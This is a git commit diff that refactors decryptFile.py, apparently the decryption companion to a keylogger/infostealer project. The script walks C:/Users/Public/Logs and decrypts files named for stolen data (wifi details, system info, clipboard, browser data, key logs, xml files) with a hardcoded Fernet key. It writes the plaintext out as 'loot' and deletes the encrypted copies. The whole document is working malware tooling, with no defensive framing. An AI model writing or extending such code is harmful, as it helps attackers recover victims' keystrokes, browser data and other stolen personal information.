b4d8667208d9f62d77474da0628be534a7cae36c
ngimb64 <56981761+ngimb64@users.noreply.github.com>
2020-08-16 14:11:59 -0400

    Update decryptFile.py

--- decryptFile.py
+++ decryptFile.py
@@ -1,31 +1,26 @@
-import sys, os, re
+import sys, os, re, pathlib
 from cryptography.fernet import Fernet
+import logging
 
 if __name__ == '__main__':
-    try:    
-        file_path = 'C:\\Users\\Public\\Logs\\'
+    try:
+        path = 'C:/Users/Public/Logs/'
         encrypted_files = [ 'e_network_wifi.txt', 'e_system_info.txt', 'e_clipboard_info.txt', 
                             'e_browser.txt', 'e_key_logs.txt' ]
-
         regex = re.compile(r'.+\.xml$')
-        path = 'C:/Users/Public/Logs'
-        re_list = []
-        for dirpath, dirnames, filenames in os.walk(path):
-            [ re_list.append(file) for file in filenames if regex.match(file) ]
 
-        encrypted_list = encrypted_files + re_list
+        for dirpath, dirnames, filenames in os.walk(path):
+            [ encrypted_files.append(file) for file in filenames if regex.match(file) ]
 
         key = b'T2UnFbwxfVlnJ1PWbixcDSxJtpGToMKotsjR4wsSJpM='
 
-        for file_decrypt in encrypted_list:
-            x = open(file_path + file_decrypt, 'rb')
-            data = x.read()
+        for file_decrypt in encrypted_files:
+            with open(path + file_decrypt, 'rb') as x:
+                data = x.read()
             decrypted = Fernet(key).decrypt(data)
-            loot = open(file_path + file_decrypt[2:], 'ab')
-            loot.write(decrypted)
-            x.close()
-            loot.close()
-            os.remove(file_path + file_decrypt)
+            with open(path + file_decrypt[2:], 'ab') as loot:
+                loot.write(decrypted)
+            os.remove(path + file_decrypt)
 
     except KeyboardInterrupt:
         print('* Ctrl + C detected...program exiting *')
